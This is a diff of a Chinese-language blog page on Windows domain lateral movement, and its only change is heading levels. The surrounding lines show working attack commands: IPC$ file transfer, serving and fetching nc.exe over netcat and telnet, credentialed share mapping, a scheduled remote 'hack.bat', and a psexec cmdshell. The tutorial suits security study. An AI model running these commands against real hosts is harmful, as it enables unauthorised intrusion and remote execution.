@@ -455,14 +455,14 @@
 <li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li>
 <li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li>
 </ol>
-<h2 id="域内的文件操作"><a href="#域内的文件操作" class="headerlink" title="域内的文件操作"></a>域内的文件操作</h2><h4 id="利用IPC"><a href="#利用IPC" class="headerlink" title="利用IPC$"></a>利用IPC$</h4><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
+<h2 id="域内的文件操作"><a href="#域内的文件操作" class="headerlink" title="域内的文件操作"></a>域内的文件操作</h2><h3 id="利用IPC"><a href="#利用IPC" class="headerlink" title="利用IPC$"></a>利用IPC$</h3><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
 <p>上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</p>
 <p>何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。</p>
 <p>如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是<br><code>copy 1.bat \\192.168.1.2\C$\</code></p>
 <p>反之就是下载。dir、copy、xcopy、move、type的参数都可以使用UNC路径。</p>
-<h4 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h4><p>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
+<h3 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h3><p>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
 <p>下载端：<code>telnet ip -f c:\nc.exe</code></p>
-<h4 id="利用文件共享"><a href="#利用文件共享" class="headerlink" title="利用文件共享"></a>利用文件共享</h4><p>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
+<h3 id="利用文件共享"><a href="#利用文件共享" class="headerlink" title="利用文件共享"></a>利用文件共享</h3><p>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
 <h2 id="域内运行命令"><a href="#域内运行命令" class="headerlink" title="域内运行命令"></a>域内运行命令</h2><h3 id="利用计划任务"><a href="#利用计划任务" class="headerlink" title="利用计划任务"></a>利用计划任务</h3><p><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
 <h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
 <blockquote>
